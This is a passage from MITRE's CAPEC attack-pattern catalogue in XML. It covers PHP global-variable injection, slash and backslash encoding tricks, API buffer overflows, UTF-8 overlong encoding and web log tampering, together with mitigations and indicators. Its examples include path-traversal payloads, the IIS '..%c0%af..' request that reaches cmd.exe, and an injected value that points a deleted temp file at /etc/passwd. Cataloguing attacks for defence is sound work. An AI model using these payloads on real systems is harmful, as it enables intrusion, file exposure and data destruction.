               <xhtml:p>Depending on the configuration, PHP may accept user-supplied variables in place of environment variables. PHP initializes global variables for all process environment variables, such as $PATH and $HOSTNAME. These variables are of critical importance because they may be used in file or network operations. If an attacker can supply a new $PATH variable (such as PATH='/var'), the program may be exploitable.</xhtml:p>
               <xhtml:p>PHP may also take field tags supplied in GET/POST requests and transform them into global variables. This is the case with the $count variable we explored in our previous example.</xhtml:p>
               <xhtml:p>Consider another example of this problem in which a program defines a variable called $tempfile. An attacker can supply a new temp file such as $tempfile = "/etc/passwd". Then the temp file may get erased later via a call to unlink($tempfile);. Now the passwd file has been erased--a bad thing indeed on most OSs.</xhtml:p>
               <xhtml:p>Also consider that the use of include() and require() first search $PATH, and that using calls to the shell may execute crucial programs such as ls. In this way, ls may be "Trojaned" (the attacker can modify $PATH to cause a Trojan copy of ls to be loaded). This type of attack could also apply to loadable libraries if $LD_LIBRARY_PATH is modified.</xhtml:p>
               <xhtml:p>Finally, some versions of PHP may pass user data to syslog as a format string, thus exposing the application to a format string buffer overflow.</xhtml:p>See also: File upload allows arbitrary file read by setting hidden form variables to match internal variable names (CVE-2000-0860)</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="473"/>
            <Related_Weakness CWE_ID="15"/>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="302"/>
            <Related_Weakness CWE_ID="94"/>
            <Related_Weakness CWE_ID="96"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-520"/>
            <Reference External_Reference_ID="REF-521"/>
            <Reference External_Reference_ID="REF-522" Section="Chapter 29. Using Register Globals"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="78" Name="Using Escaped Slashes in Alternate Encoding" Abstraction="Detailed" Status="Draft">
         <Description>This attack targets the use of the backslash in alternate encoding. An attacker can provide a backslash as a leading character and causes a parser to believe that the next character is special. This is called an escape. By using that trick, the attacker tries to exploit alternate ways to encode the same character which leads to filter problems and opens avenues to attack.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker can send input data to the host target (e.g., via http request or command line request</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker craft malicious input data which includes escaped slashes. The attacker may need multiple attempts before finding a successful combination.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The application accepts the backlash character as escape character.</Prerequisite>
            <Prerequisite>The application server does incomplete input data decoding, filtering and validation.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The attacker can naively try backslash character and discover that the target host uses it as escape character.</Skill>
            <Skill Level="Medium">The attacker may need deep understanding of the host target in order to exploit the vulnerability. The attacker may also use automated tools to probe for this vulnerability.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>An attacker can use a fuzzer in order to probe for this vulnerability. The fuzzer should generate suspicious network activity noticeable by an intrusion detection system.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>Denial of Service</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Verify that the user-supplied data does not use backslash character to escape malicious characters.</Mitigation>
            <Mitigation>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.</Mitigation>
            <Mitigation>Be aware of the threat of alternative method of data encoding.</Mitigation>
            <Mitigation>Regular expressions can be used to filter out backslash. Make sure you decode before filtering and validating the untrusted input data.</Mitigation>
            <Mitigation>In the case of path traversals, use the principle of least privilege when determining access rights to file systems. Do not allow users to access directories/files that they should not access.</Mitigation>
            <Mitigation>Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.</Mitigation>
            <Mitigation>Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>For example, the byte pair \0 might result in a single zero byte (a NULL) being sent. Another example is \t, which is sometimes converted into a tab character. There is often an equivalent encoding between the back slash and the escaped back slash. This means that \/ results in a single forward slash. A single forward slash also results in a single forward slash. The encoding looks like this:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">/ yields /<xhtml:br/>\/ yields /</xhtml:div>
            </Example>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Escaped Slashes in Alternate Encodings</xhtml:div>
               <xhtml:p>An attack leveraging this pattern is very simple. If you believe the target may be filtering the slash, attempt to supply \/ and see what happens. Example command strings to try out include</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">CWD ..\/..\/..\/..\/winnt</xhtml:div>
               <xhtml:p>which converts in many cases to</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">CWD ../../../../winnt</xhtml:div>
               <xhtml:p>To probe for this kind of problem, a small C program that uses string output routines can be very useful. File system calls make excellent testing fodder. The simple snippet</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">int main(int argc, char* argv[])<xhtml:br/>{<xhtml:div style="margin-left:10px;">puts("\/ \\ \? \. \| ");<xhtml:br/>return 0;</xhtml:div>
                  <xhtml:br/>}</xhtml:div>
               <xhtml:p>produces the output</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">/ \ ? . |</xhtml:div>
               <xhtml:p>Clearly, the back slash is ignored, and thus we have hit on a number of alternative encodings to experiment with. Given our previous example, we can extend the attack to include other possibilities:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">CWD ..\?\?\?\?\/..\/..\/..\/winnt<xhtml:br/>CWD \.\.\/\.\.\/\.\.\/\.\.\/winnt<xhtml:br/>CWD ..\|\|\|\|\/..\/..\/..\/winnt</xhtml:div>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="180"/>
            <Related_Weakness CWE_ID="181"/>
            <Related_Weakness CWE_ID="173"/>
            <Related_Weakness CWE_ID="171"/>
            <Related_Weakness CWE_ID="172"/>
            <Related_Weakness CWE_ID="73"/>
            <Related_Weakness CWE_ID="21"/>
            <Related_Weakness CWE_ID="22"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="79" Name="Using Slashes in Alternate Encoding" Abstraction="Detailed" Status="Draft">
         <Description>This attack targets the encoding of the Slash characters. An attacker would try to exploit common filtering problems related to the use of the slashes characters to gain access to resources on the target host. Directory-driven systems, such as file systems and databases, typically use the slash character to indicate traversal between directories or other container components. For murky historical reasons, PCs (and, as a result, Microsoft OSs) choose to use a backslash, whereas the UNIX world typically makes use of the forward slash. The schizophrenic result is that many MS-based systems are required to understand both forms of the slash. This gives the attacker many opportunities to discover and abuse a number of common filtering problems. The goal of this pattern is to discover server software that only applies filters to one version, but not the other.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker has access to a resource path and required to use slashes as resource delimiter.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker tries variation and combination of the slashes characters in different encoding format.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker found an unfiltered combination which maps to a valid path and accesses unauthorized resources (directories, files, etc.)</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The application server accepts paths to locate resources.</Prerequisite>
            <Prerequisite>The application server does insufficient input data validation on the resource path requested by the user.</Prerequisite>
            <Prerequisite>The access right to resources are not set properly.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can try variation of the slashes characters.</Skill>
            <Skill Level="Medium">An attacker can use more sophisticated tool or script to scan a website and find a path filtering problem.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>If the first path decoding process has left some invalid or blacklisted characters, that may be a sign that the request is malicious.</Indicator>
            <Indicator>Traffic filtering with IDS (or proxy) can detect request with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.</Indicator>
            <Indicator>An attacker can use a fuzzer in order to probe for a UTF-8 encoding vulnerability. The fuzzer should generate suspicious network activity.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process. Refer to the RFCs to safely decode URL.</Mitigation>
            <Mitigation>When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.</Mitigation>
            <Mitigation>There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx)</Mitigation>
            <Mitigation>Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)</Mitigation>
            <Mitigation>Test your path decoding process against malicious input.</Mitigation>
            <Mitigation>In the case of path traversals, use the principle of least privilege when determining access rights to file systems. Do not allow users to access directories/files that they should not access.</Mitigation>
            <Mitigation>Assume all input is malicious. Create a white list that defines all valid input to the application based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Slashes in Alternate Encodings</xhtml:div>
               <xhtml:p>The two following requests are equivalent on most Web servers:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://target server/some_directory\..\..\..\winnt</xhtml:div>
               <xhtml:p>is equivalent to</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://target server/some_directory/../../../winnt</xhtml:div>
               <xhtml:p>Multiple encoding conversion problems can also be leveraged as various slashes are instantiated in URL-encoded, UTF-8, or Unicode. Consider the strings</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://target server/some_directory\..%5C..%5C..\winnt</xhtml:div>
               <xhtml:p>where %5C is equivalent to the \ character.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="173"/>
            <Related_Weakness CWE_ID="171"/>
            <Related_Weakness CWE_ID="180"/>
            <Related_Weakness CWE_ID="181"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="73"/>
            <Related_Weakness CWE_ID="21"/>
            <Related_Weakness CWE_ID="22"/>
            <Related_Weakness CWE_ID="185"/>
            <Related_Weakness CWE_ID="200"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-525"/>
            <Reference External_Reference_ID="REF-495"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="8" Name="Buffer Overflow in an API Call" Abstraction="Detailed" Status="Draft">
         <Description>This attack targets libraries or shared code modules which are vulnerable to buffer overflow attacks. An attacker who has access to an API may try to embed malicious code in the API function call and exploit a buffer overflow vulnerability in the function's implementation. All clients that make use of the code library thus become vulnerable by association. This has a very broad effect on security across a system, usually affecting more than one software process.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Experiment</Phase>
               <Description>An attacker can call an API exposed by the target host.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>On the probing stage, the attacker injects malicious code using the API call and observes the results. The attacker's goal is to uncover a buffer overflow vulnerability.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker finds a buffer overflow vulnerability, crafts malicious code and injects it through an API call. The attacker can at worst execute remote code on the target host.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target host exposes an API to the user.</Prerequisite>
            <Prerequisite>One or more API functions exposed by the target host has a buffer overflow vulnerability.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.</Skill>
            <Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use a language or compiler that performs automatic bounds checking.</Mitigation>
            <Mitigation>Use secure functions not vulnerable to buffer overflow.</Mitigation>
            <Mitigation>If you have to use dangerous functions, make sure that you do boundary checking.</Mitigation>
            <Mitigation>Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</Mitigation>
            <Mitigation>Use OS-level preventative functionality. Not a complete solution.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Libc in FreeBSD</xhtml:div>
               <xhtml:p>A buffer overflow in the FreeBSD utility setlocale (found in the libc module) puts many programs at risk all at once.</xhtml:p>
            </Example>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Xtlib</xhtml:div>
               <xhtml:p>A buffer overflow in the Xt library of the X windowing system allows local users to execute commands with root privileges.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="119"/>
            <Related_Weakness CWE_ID="118"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="680"/>
            <Related_Weakness CWE_ID="733"/>
            <Related_Weakness CWE_ID="697"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="80" Name="Using UTF-8 Encoding to Bypass Validation Logic" Abstraction="Detailed" Status="Draft">
         <Description>This attack is a specific variation on leveraging alternate encodings to bypass validation logic. This attack leverages the possibility to encode potentially harmful input in UTF-8 and submit it to applications not expecting or effective at validating this encoding standard making input filtering difficult. UTF-8 (8-bit UCS/Unicode Transformation Format) is a variable-length character encoding for Unicode. Legal UTF-8 characters are one to four bytes long. However, early version of the UTF-8 specification got some entries wrong (in some cases it permitted overlong characters). UTF-8 encoders are supposed to use the "shortest possible" encoding, but naive decoders may accept encodings that are longer than necessary. According to the RFC 3629, a particularly subtle form of this attack can be carried out against a parser which performs security-critical validity checks against the UTF-8 encoded form of its input, but interprets certain illegal octet sequences as characters.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="64"/>
            <Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="71"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.</Description>
               <Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</Technique>
               <Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various UTF-8 encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.</Description>
               <Technique>Try to use UTF-8 encoding of content in Scripts in order to bypass validation routines.</Technique>
               <Technique>Try to use UTF-8 encoding of content in HTML in order to bypass validation routines.</Technique>
               <Technique>Try to use UTF-8 encoding of content in CSS in order to bypass validation routines.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The application's UTF-8 decoder accepts and interprets illegal UTF-8 characters or non-shortest format of UTF-8 encoding.</Prerequisite>
            <Prerequisite>Input filtering and validating is not done properly leaving the door open to harmful characters for the target host.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can inject different representation of a filtered character in UTF-8 format.</Skill>
            <Skill Level="Medium">An attacker may craft subtle encoding of input data by using the knowledge that she has gathered about the target host.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>A web page that contains overly long UTF-8 codes constitute a protocol anomaly, and could be an indication that an attacker is attempting to exploit a vulnerability on the target host.</Indicator>
            <Indicator>An attacker can use a fuzzer in order to probe for a UTF-8 encoding vulnerability. The fuzzer should generate suspicious network activity noticeable by an intrusion detection system.</Indicator>
            <Indicator>An IDS filtering network traffic may be able to detect illegal UTF-8 characters.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>The Unicode Consortium recognized multiple representations to be a problem and has revised the Unicode Standard to make multiple representations of the same code point with UTF-8 illegal. The UTF-8 Corrigendum lists the newly restricted UTF-8 range (See references). Many current applications may not have been revised to follow this rule. Verify that your application conform to the latest UTF-8 encoding specification. Pay extra attention to the filtering of illegal characters.</Mitigation>
            <Mitigation>
               <xhtml:p>The exact response required from an UTF-8 decoder on invalid input is not uniformly defined by the standards. In general, there are several ways a UTF-8 decoder might behave in the event of an invalid byte sequence:</xhtml:p>
               <xhtml:div style="margin-left:10px;">
                  <xhtml:ul>
                     <xhtml:li>1. Insert a replacement character (e.g. '?', '').</xhtml:li>
                     <xhtml:li>2. Ignore the bytes.</xhtml:li>
                     <xhtml:li>3. Interpret the bytes according to a different character encoding (often the ISO-8859-1 character map).</xhtml:li>
                     <xhtml:li>4. Not notice and decode as if the bytes were some similar bit of UTF-8.</xhtml:li>
                     <xhtml:li>5. Stop decoding and report an error (possibly giving the caller the option to continue).</xhtml:li>
                  </xhtml:ul>
               </xhtml:div>
               <xhtml:p>It is possible for a decoder to behave in different ways for different types of invalid input.</xhtml:p>
               <xhtml:p>RFC 3629 only requires that UTF-8 decoders must not decode "overlong sequences" (where a character is encoded in more bytes than needed but still adheres to the forms above). The Unicode Standard requires a Unicode-compliant decoder to "...treat any ill-formed code unit sequence as an error condition. This guarantees that it will neither interpret nor emit an ill-formed code unit sequence."</xhtml:p>
               <xhtml:p>Overlong forms are one of the most troublesome types of UTF-8 data. The current RFC says they must not be decoded but older specifications for UTF-8 only gave a warning and many simpler decoders will happily decode them. Overlong forms have been used to bypass security validations in high profile products including Microsoft's IIS web server. Therefore, great care must be taken to avoid security issues if validation is performed before conversion from UTF-8, and it is generally much simpler to handle overlong forms before any input validation is done.</xhtml:p>
               <xhtml:p>To maintain security in the case of invalid input, there are two options. The first is to decode the UTF-8 before doing any input validation checks. The second is to use a decoder that, in the event of invalid input, returns either an error or text that the application considers to be harmless. Another possibility is to avoid conversion out of UTF-8 altogether but this relies on any other software that the data is passed to safely handling the invalid data.</xhtml:p>
               <xhtml:p>Another consideration is error recovery. To guarantee correct recovery after corrupt or lost bytes, decoders must be able to recognize the difference between lead and trail bytes, rather than just assuming that bytes will be of the type allowed in their position.</xhtml:p>
            </Mitigation>
            <Mitigation>For security reasons, a UTF-8 decoder must not accept UTF-8 sequences that are longer than necessary to encode a character. If you use a parser to decode the UTF-8 encoding, make sure that parser filter the invalid UTF-8 characters (invalid forms or overlong forms).</Mitigation>
            <Mitigation>Look for overlong UTF-8 sequences starting with malicious pattern. You can also use a UTF-8 decoder stress test to test your UTF-8 parser (See Markus Kuhn's UTF-8 and Unicode FAQ in reference section)</Mitigation>
            <Mitigation>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Perhaps the most famous UTF-8 attack was against unpatched Microsoft Internet Information Server (IIS) 4 and IIS 5 servers. If an attacker made a request that looked like this</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">http://servername/scripts/..%c0%af../winnt/system32/ cmd.exe</xhtml:div>
               <xhtml:p>the server didn't correctly handle %c0%af in the URL. What do you think %c0%af means? It's 11000000 10101111 in binary; and if it's broken up using the UTF-8 mapping rules, we get this: 11000000 10101111. Therefore, the character is 00000101111, or 0x2F, the slash (/) character! The %c0%af is an invalid UTF-8 representation of the / character. Such an invalid UTF-8 escape is often referred to as an overlong sequence.</xhtml:p>
               <xhtml:p>So when the attacker requested the tainted URL, he accessed</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="result">http://servername/scripts/../../winnt/system32/cmd.exe</xhtml:div>
               <xhtml:p>In other words, he walked out of the script's virtual directory, which is marked to allow program execution, up to the root and down into the system32 directory, where he could pass commands to the command shell, Cmd.exe.</xhtml:p>See also: CVE-2000-0884</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="173"/>
            <Related_Weakness CWE_ID="172"/>
            <Related_Weakness CWE_ID="180"/>
            <Related_Weakness CWE_ID="181"/>
            <Related_Weakness CWE_ID="171"/>
            <Related_Weakness CWE_ID="73"/>
            <Related_Weakness CWE_ID="21"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="692"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-112" Section="5.9. Character Encoding"/>
            <Reference External_Reference_ID="REF-530" Section="Chapter 12"/>
            <Reference External_Reference_ID="REF-531"/>
            <Reference External_Reference_ID="REF-532" Section="UTF-8"/>
            <Reference External_Reference_ID="REF-533"/>
            <Reference External_Reference_ID="REF-114"/>
            <Reference External_Reference_ID="REF-535"/>
            <Reference External_Reference_ID="REF-525"/>
            <Reference External_Reference_ID="REF-537"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="81" Name="Web Logs Tampering" Abstraction="Detailed" Status="Draft">
         <Description>Web Logs Tampering attacks involve an attacker injecting, deleting or otherwise tampering with the contents of web logs typically for the purposes of masking other malicious behavior. Additionally, writing malicious data to log files may target jobs, filters, reports, and other agents that process the logs in an asynchronous attack pattern. This pattern of attack is similar to "Log Injection-Tampering-Forging" except that in this case, the attack is targeting the logs of the web server and not the application.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="268"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine Application Web Server Log File Format] The attacker observes the system and looks for indicators of which logging utility is being used by the web server.</Description>
               <Technique>Determine logging utility being used by application web server (e.g. log4j), only possible if the application is known by the attacker or if the application returns error messages with logging utility information.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Determine Injectable Content] The attacker launches various logged actions with malicious data to determine what sort of log injection is possible.</Description>
               <Technique>Attacker triggers logged actions with maliciously crafted data as inputs, parameters, arguments, etc.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted request that the web server will receive and write into the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.</Description>
               <Technique>
